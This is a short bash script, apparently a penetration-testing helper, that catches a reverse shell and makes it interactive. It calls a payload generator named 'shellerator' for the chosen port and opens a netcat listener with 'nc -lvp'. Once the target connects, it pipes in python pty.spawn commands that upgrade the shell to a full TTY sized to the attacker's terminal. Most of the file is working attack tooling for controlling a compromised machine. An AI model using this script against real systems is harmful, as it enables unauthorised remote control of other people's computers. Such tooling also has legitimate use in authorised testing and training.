#!/bin/bash

usage (){
    echo "$0 -p <port to listen> "
    exit 0
}

while getopts ":p:h" option
do
        case $option in
                p)
                        PORT=$OPTARG
                        ;;

                h)
                        usage
                        ;;
                \?)
                        echo "$OPTARG : option invalide"
                        usage
                        exit 1
                        ;;
        esac
done
if [[ -z "$PORT" ]]; then
    echo "Missing PORT"
    usage
fi

shellerator -lp $PORT

#If error in shellerator do not continue
if [[ $? != 0 ]]
then
    exit
fi
STTY_ROWS=$(stty size | cut -d" " -f 1)
STTY_COLS=$(stty size | cut -d" " -f 2)

UPDATE_STTY="stty rows $STTY_ROWS cols $STTY_COLS"
echo "/usr/bin/env python -c 'import pty; pty.spawn([\"bash\",\"-c\",\"$UPDATE_STTY  ; bash\"])'" >> comm.txt
echo "/usr/bin/env python2.7 -c 'import pty; pty.spawn([\"bash\",\"-c\",\"$UPDATE_STTY  ; bash\"])'" > comm.txt
echo "/usr/bin/env python3 -c 'import pty; pty.spawn([\"bash\",\"-c\",\"$UPDATE_STTY  ; bash\"])'" >> comm.txt

stty raw -echo 
cat comm.txt -| nc -lvp $PORT
reset
rm comm.txt
